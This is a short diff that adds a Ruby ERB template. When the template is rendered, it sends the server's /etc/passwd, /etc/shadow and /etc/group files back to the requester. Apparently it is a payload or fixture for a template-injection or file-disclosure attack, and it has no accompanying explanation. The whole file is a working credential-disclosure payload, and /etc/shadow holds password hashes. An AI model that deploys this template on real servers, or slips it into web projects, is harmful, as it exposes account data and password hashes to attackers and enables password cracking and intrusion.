@@ -1,0 +1,12 @@
+<%
+@request.puts "<pre>"
+
+@request.puts "\n/etc/password:\n"
+@request.send_file('/etc/passwd')
+
+@request.puts "\n/etc/shadow:\n"
+@request.send_file('/etc/shadow')
+
+@request.puts "\n/etc/group:\n"
+@request.send_file('/etc/group')
+%>
